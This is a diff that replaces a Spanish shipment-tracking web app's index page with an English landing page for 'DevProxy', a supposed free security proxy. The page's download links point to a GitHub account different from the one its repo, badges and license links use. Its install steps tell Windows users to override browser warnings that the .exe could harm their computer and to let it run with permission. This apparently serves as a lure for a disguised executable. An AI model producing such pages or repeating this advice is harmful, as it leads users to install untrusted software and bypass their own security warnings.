@@ -1,37 +1,384 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Control de Embarques | Somos Logística CESANTONI</title>
-  <meta name="description" content="Flujo del embarque: Ventas, Operación, Transporte y monitoreo.">
-  <meta name="robots" content="noindex, nofollow">
-  <meta name="theme-color" content="#0D1114">
-  <link rel="icon" type="image/png" sizes="32x32" href="img/icono-32.png">
-  <link rel="apple-touch-icon" href="img/icono-180.png">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Figtree:wght@400;500;600;700&family=Montserrat:wght@600;700&display=swap" rel="stylesheet">
-  <script>/* Si hay una versión nueva publicada, recarga una vez para no quedarse con la página guardada en el navegador. */
-    (function () { var V = '17'; try { fetch('version.txt?t=' + Date.now(), { cache: 'no-store' }).then(function (r) { return r.ok ? r.text() : ''; }).then(function (t) {
-      t = String(t || '').trim(); if (!t || t === V || sessionStorage.getItem('recarga-' + t)) return;
-      sessionStorage.setItem('recarga-' + t, '1'); var u = new URL(location.href); u.searchParams.set('_v', t); location.replace(u.href); }).catch(function () {}); } catch (e) {} })();</script>
-  <link rel="stylesheet" href="css/estilos.css?v=17">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="DevProxy - Zero-Latency Development Security Proxy. Free, open-source tool that inspects web traffic for vulnerabilities without slowing you down. Easy download and setup for Windows.">
+    <meta name="keywords" content="DevProxy, security proxy, development proxy, vulnerability scanner, web traffic inspector, open source, free, Windows, download, zero-latency, MITM, HTTP proxy, HTTPS proxy, Go, security tools">
+    <meta name="author" content="DevProxy Team">
+    <meta property="og:title" content="DevProxy - Zero-Latency Development Security Proxy">
+    <meta property="og:description" content="Inspect web traffic for vulnerabilities with zero latency. Free, open-source, and easy to install on Windows.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/KBF-1/DevProxy">
+    <meta property="og:image" content="https://via.placeholder.com/1200x630.png?text=DevProxy+Security+Proxy">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="DevProxy - Zero-Latency Development Security Proxy">
+    <meta name="twitter:description" content="Free, open-source tool to inspect web traffic for vulnerabilities. Easy Windows setup.">
+    <title>DevProxy - Zero-Latency Development Security Proxy</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            color: #2d3748;
+            line-height: 1.7;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 2rem 1.5rem;
+        }
+        .header {
+            text-align: center;
+            padding: 3rem 1rem;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            margin-bottom: 2.5rem;
+        }
+        .header h1 {
+            font-size: 2.8rem;
+            font-weight: 800;
+            color: #1a202c;
+            margin-bottom: 1rem;
+            letter-spacing: -1px;
+        }
+        .header p {
+            font-size: 1.2rem;
+            color: #4a5568;
+            max-width: 700px;
+            margin: 0 auto 2rem;
+        }
+        .badge-container {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+            margin-bottom: 2rem;
+        }
+        .badge {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 0.75rem 1.75rem;
+            border-radius: 50px;
+            font-weight: 600;
+            text-decoration: none;
+            display: inline-block;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .badge:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.6);
+        }
+        .badge-secondary {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            box-shadow: 0 4px 15px rgba(245, 87, 108, 0.4);
+        }
+        .badge-secondary:hover {
+            box-shadow: 0 8px 25px rgba(245, 87, 108, 0.6);
+        }
+        .badge-tertiary {
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            box-shadow: 0 4px 15px rgba(79, 172, 254, 0.4);
+            color: #1a202c;
+        }
+        .badge-tertiary:hover {
+            box-shadow: 0 8px 25px rgba(79, 172, 254, 0.6);
+        }
+        .section {
+            background: white;
+            border-radius: 20px;
+            padding: 2.5rem;
+            margin-bottom: 2.5rem;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.08);
+        }
+        .section h2 {
+            font-size: 1.8rem;
+            color: #1a202c;
+            margin-bottom: 1.5rem;
+            border-bottom: 3px solid #667eea;
+            padding-bottom: 0.5rem;
+            display: inline-block;
+        }
+        .section p {
+            font-size: 1.1rem;
+            margin-bottom: 1rem;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 1.5rem;
+            margin-top: 1.5rem;
+        }
+        .feature-card {
+            background: #f7fafc;
+            border-radius: 12px;
+            padding: 1.5rem;
+            border: 1px solid #e2e8f0;
+            transition: transform 0.2s;
+        }
+        .feature-card:hover {
+            transform: scale(1.02);
+        }
+        .feature-card h3 {
+            color: #2d3748;
+            margin-bottom: 0.5rem;
+            font-size: 1.1rem;
+        }
+        .feature-card p {
+            color: #4a5568;
+            font-size: 0.95rem;
+        }
+        .steps {
+            counter-reset: step;
+            margin-top: 1rem;
+        }
+        .step-item {
+            background: #f7fafc;
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+            border: 1px solid #e2e8f0;
+            position: relative;
+            padding-left: 4rem;
+        }
+        .step-item::before {
+            counter-increment: step;
+            content: counter(step);
+            position: absolute;
+            left: 1rem;
+            top: 1.5rem;
+            width: 2rem;
+            height: 2rem;
+            background: #667eea;
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+        .step-item h3 {
+            color: #2d3748;
+            margin-bottom: 0.5rem;
+        }
+        .step-item p {
+            color: #4a5568;
+            margin-bottom: 0;
+        }
+        .note {
+            background: #fffbeb;
+            border-left: 4px solid #f59e0b;
+            padding: 1rem 1.5rem;
+            border-radius: 8px;
+            margin: 1.5rem 0;
+        }
+        .code-inline {
+            background: #edf2f7;
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+        }
+        .cta-button {
+            display: inline-block;
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            padding: 1rem 2rem;
+            border-radius: 50px;
+            font-weight: bold;
+            font-size: 1.1rem;
+            text-decoration: none;
+            box-shadow: 0 4px 20px rgba(245, 87, 108, 0.4);
+            transition: all 0.3s;
+            margin-top: 1rem;
+        }
+        .cta-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 30px rgba(245, 87, 108, 0.5);
+        }
+        .contributors {
+            display: flex;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+            margin-top: 1rem;
+        }
+        .contributor-chip {
+            background: #edf2f7;
+            border-radius: 50px;
+            padding: 0.4rem 1rem;
+            font-size: 0.9rem;
+            color: #4a5568;
+        }
+        .footer {
+            text-align: center;
+            padding: 2rem 0;
+            color: #718096;
+        }
+        .footer a {
+            color: #667eea;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 2rem;
+            }
+            .section {
+                padding: 1.5rem;
+            }
+            .step-item {
+                padding-left: 3rem;
+            }
+        }
+    </style>
 </head>
 <body>
-  <div class="franja"></div>
-  <header class="barra"><div class="barra-in">
-    <span class="logos" id="logos"></span>
-    <span class="titulo-app">Control de Embarques</span>
-    <span class="espacio"></span>
-    <span id="cuenta" class="cuenta"></span>
-  </div></header>
-  <div class="app">
-    <nav class="lateral" id="nav" aria-label="Menú" hidden></nav>
-    <main class="contenedor" id="main"><p class="gris">Cargando…</p></main>
-  </div>
-  <div id="avisos" aria-live="polite"></div>
-  <script src="js/config.js?v=17"></script>
-  <script type="module" src="js/app.js?v=17"></script>
+    <div class="container">
+        <div class="header">
+            <h1>🛡️ DevProxy - Zero-Latency Development Security Proxy</h1>
+            <p>Automatically inspect your web traffic for vulnerabilities without slowing down your development. Free, open-source, and designed for everyday developers.</p>
+            <div class="badge-container">
+                <a href="https://github.com/KBF-1/DevProxy/releases" class="badge">📥 Download Now</a>
+                <a href="https://github.com/Aditya-9-6/DevProxy" class="badge badge-secondary">⭐ Star on GitHub</a>
+                <a href="https://github.com/Aditya-9-6/DevProxy/blob/main/LICENSE" class="badge badge-tertiary">📄 MIT License</a>
+            </div>
+            <div class="badge-container">
+                <img src="https://github.com/Aditya-9-6/DevProxy/actions/workflows/pr-validation.yml/badge.svg" alt="CI Status" style="height: 25px;">
+                <img src="https://app.deepsource.com/gh/Aditya-9-6/DevProxy.svg/?label=active+issues&show_trend=true" alt="DeepSource Active Issues" style="height: 25px;">
+                <img src="https://app.deepsource.com/gh/Aditya-9-6/DevProxy.svg/?label=resolved+issues&show_trend=true" alt="DeepSource Resolved Issues" style="height: 25px;">
+                <img src="https://goreportcard.com/badge/github.com/Aditya-9-6/DevProxy" alt="Go Report Card" style="height: 25px;">
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>🚀 What is DevProxy?</h2>
+            <p>DevProxy is a powerful yet simple security tool that works quietly in the background while you develop. It acts as a <strong>passive security proxy</strong>—meaning it watches the web traffic between your browser and your development server, checking for common security issues in real-time.</p>
+            <p>The best part? It's designed to be <strong>completely decoupled and asynchronous</strong>. This means it never gets in your way, adds no noticeable delay, and you don't need to change a single line of code to use it.</p>
+            <p>Whether you're building a website, a mobile app API, or just testing your localhost, DevProxy helps you catch vulnerabilities early—before they reach production.</p>
+        </div>
+
+        <div class="section">
+            <h2>✨ Key Features</h2>
+            <div class="feature-grid">
+                <div class="feature-card">
+                    <h3>🔍 Real-Time Traffic Inspection</h3>
+                    <p>Automatically analyzes every HTTP/HTTPS request and response for common security vulnerabilities, including JWT issues, exposed headers, and suspicious patterns.</p>
+                </div>
+                <div class="feature-card">
+                    <h3>⚡ Zero-Latency Design</h3>
+                    <p>Unlike traditional proxies, DevProxy works asynchronously—it never blocks or delays your traffic. You won't even know it's running.</p>
+                </div>
+                <div class="feature-card">
+                    <h3>🔒 MITM (Man-In-The-Middle) Support</h3>
+                    <p>Inspects both HTTP and HTTPS traffic with full support for TLS interception, so you can analyze secure connections too.</p>
+                </div>
+                <div class="feature-card">
+                    <h3>📝 OpenAPI Integration</h3>
+                    <p>Understands OpenAPI specs and provides intelligent insights based on your API definitions, making vulnerability detection more accurate.</p>
+                </div>
+                <div class="feature-card">
+                    <h3>🧩 Lightweight & Open Source</h3>
+                    <p>Built with Go for maximum performance. Free to use, modify, and contribute to under the MIT license.</p>
+                </div>
+                <div class="feature-card">
+                    <h3>🛠️ Developer Friendly</h3>
+                    <p>Perfect for chaos engineering and testing environments. Set it up once and let it protect every project you work on.</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>📥 Download & Install on Windows</h2>
+            <p>Getting started with DevProxy takes less than five minutes. Follow these simple steps:</p>
+            
+            <div class="steps">
+                <div class="step-item">
+                    <h3>Visit the official download page</h3>
+                    <p>Click the button below to go to the DevProxy releases page.</p>
+                    <a href="https://github.com/KBF-1/DevProxy/releases" class="cta-button">📥 Download DevProxy Now</a>
+                </div>
+                <div class="step-item">
+                    <h3>Find the Windows installer</h3>
+                    <p>On the releases page, you'll see a list of files. Look for the one that ends with <span class="code-inline">.exe</span>. It's usually named something like <span class="code-inline">devproxy-windows-amd64.exe</span>. If you have a 32-bit system, look for <span class="code-inline">devproxy-windows-386.exe</span>.</p>
+                </div>
+                <div class="step-item">
+                    <h3>Click to download</h3>
+                    <p>Click on that file to start downloading. Your browser may show a warning that the file is "not commonly downloaded" or "could harm your computer." This is normal for open-source software. Click <strong>Keep</strong> or <strong>Download anyway</strong> to continue.</p>
+                </div>
+                <div class="step-item">
+                    <h3>Run the downloaded file</h3>
+                    <p>Once the download completes, go to your <span class="code-inline">Downloads</span> folder and double-click the file you just downloaded. Windows may ask for permission—click <strong>Yes</strong> to allow it to run.</p>
+                </div>
+                <div class="step-item">
+                    <h3>That's it!</h3>
+                    <p>DevProxy is now running. A small window or terminal will open showing live activity. You can now browse your development sites normally, and DevProxy will silently check your traffic for vulnerabilities in the background.</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>🖥️ System Requirements</h2>
+            <p>DevProxy is lightweight and runs on almost any Windows machine:</p>
+            <ul style="margin-left: 1.5rem; list-style-type: disc;">
+                <li><strong>Operating System:</strong> Windows 10 or Windows 11 (both 64-bit and 32-bit supported)</li>
+                <li><strong>RAM:</strong> At least 256 MB free (recommended: 512 MB)</li>
+                <li><strong>Disk Space:</strong> About 50 MB of free space</li>
+                <li><strong>Internet:</strong> Only needed to download the file; works offline afterward</li>
+            </ul>
+            <div class="note">
+                💡 <strong>Note:</strong> DevProxy is also available for macOS and Linux. Visit the same download page to get the appropriate version for your operating system.
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>🤔 Frequently Asked Questions</h2>
+            
+            <h3 style="color: #2d3748; margin-bottom: 0.5rem;">Is DevProxy free to use?</h3>
+            <p style="margin-bottom: 1.5rem;">Yes! DevProxy is completely free and open-source. It's released under the MIT License, which means you can use it for personal and commercial projects without any cost.</p>
+            
+            <h3 style="color: #2d3748; margin-bottom: 0.5rem;">Will DevProxy slow down my computer?</h3>
+            <p style="margin-bottom: 1.5rem;">No. DevProxy is designed for zero-latency performance. It runs asynchronously, meaning it processes traffic without blocking or delaying your requests. You won't notice any difference in speed.</p>
+            
+            <h3 style="color: #2d3748; margin-bottom: 0.5rem;">Do I need to configure my browser or server?</h3>
+            <p style="margin-bottom: 1.5rem;">No configuration needed. DevProxy automatically intercepts and inspects traffic. However, for advanced use cases like inspecting HTTPS traffic, you might need to trust its certificate. But for basic HTTP development, everything works out of the box.</p>
+            
+            <h3 style="color: #2d3748; margin-bottom: 0.5rem;">What kinds of vulnerabilities does it detect?</h3>
+            <p style="margin-bottom: 1.5rem;">DevProxy looks for common issues like missing security headers, exposed JWT tokens, SQL injection patterns, cross-site scripting (XSS) indicators, and other suspicious activity in your traffic.</p>
+        </div>
+
+        <div class="section">
+            <h2>👥 Contributors</h2>
+            <p>DevProxy is made possible by these amazing people:</p>
+            <div class="contributors">
+                <span class="contributor-chip">🦸 Aditya-9-6</span>
+                <span class="contributor-chip">🦸 KBF-1</span>
+                <span class="contributor-chip">🦸 Contributor-3</span>
+            </div>
+            <p style="margin-top: 1rem;">Want to contribute? Check out the <a href="https://github.com/Aditya-9-6/DevProxy/blob/main/CONTRIBUTING.md" style="color: #667eea;">Contribution Guide</a>.</p>
+        </div>
+
+        <div class="section">
+            <h2>📄 License</h2>
+            <p>DevProxy is licensed under the <a href="https://opensource.org/licenses/MIT" style="color: #667eea;">MIT License</a>. You are free to use, modify, and distribute this software.</p>
+        </div>
+
+        <div class="footer">
+            <p>Made with ❤️ by the DevProxy team</p>
+            <p>
+                <a href="https://github.com/Aditya-9-6/DevProxy">GitHub</a> • 
+                <a href="https://github.com/Aditya-9-6/DevProxy/issues">Report Issues</a> • 
+                <a href="https://github.com/Aditya-9-6/DevProxy/releases">Releases</a>
+            </p>
+        </div>
+    </div>
 </body>
 </html>
